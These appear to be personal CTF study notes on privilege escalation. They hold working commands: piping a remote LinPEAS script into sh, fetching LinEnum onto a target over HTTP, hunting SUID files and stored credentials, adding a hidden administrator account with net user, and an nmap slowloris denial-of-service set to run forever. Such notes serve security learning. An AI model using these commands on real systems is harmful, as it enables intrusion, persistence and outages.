
# Enumerate

On Linux ideally we would be looking for opportunities to gain access to a user account. 
SSH keys stored at `/home/<user>/.ssh` 

In CTFs it's also not infrequent to find credentials lying around somewhere on the box. 

Some exploits will also allow you to add your own account. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

shows current users permissions
`sudo -l

first ssh into ip THEN
```
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

## LinEnum

[LinEnum GitHub](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

There are two ways to get LinEnum on the target machine. 

1. Go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using **"python3 -m http.server 8000"** . Then using **"wget"** on the target machine, and your local IP, you can grab the file from your local machine. Then make the file executable using the command **"chmod +x FILENAME.sh"**.
2. if you have sufficient permissions, copy the raw LinEnum code from your local machine and paste it into a new file on the target, using Vi or Nano. Once you've done this, you can save the file with the **".sh"** extension. Then make the file executable using the command **"chmod +x FILENAME.sh"**.

Start a server from the directory that contains LinEnum.sh
```bash
(raz㉿kali)-[~/LinEnum]
└─$ python -m http.server 9000
```
1. from the target use `wget http://10.4.3.201:9000/LinEnum.sh
3. `chmod +x LinEnum.sh
4. Run `./LinEnum.sh` to begin scan



# Exploiting SUID Files

SUID files: Look like
`-rwsr-xr-x
Notice the ***'S'***

ctrl+F to find this part of your LinEnum scan
```
[-] SUID files:
-rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount
-rwsr-xr-x 1 root root 8392 Jun 4 2019 /home/user5/script
-rwsr-xr-x 1 root root 8392 Jun 4 2019 /home/user3/shell
```
OR
Use this command to search the system for SUID/GUID files:
`find / -perm -u=s -type f 2>/dev/null"** to search the file system for SUID/GUID files

---
# Exploiting a writable /etc/passwd



# Handy Nix Files

contains ssh configurations such as: PasswordAurhentication
`etc/ssh/ssshd_config

## Windows 

VNC servers, for example, frequently leave passwords in the registry stored in plaintext. 

Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`  or `C:\xampp\FileZilla Server\FileZilla Server.xml`  
- These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:

`net user <username> <password> /add`

`net localgroup administrators <username> /add`

---

# Now you're Here..

launche DOS attack using nmap scripts
`nmap 192.168.1.105 -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true

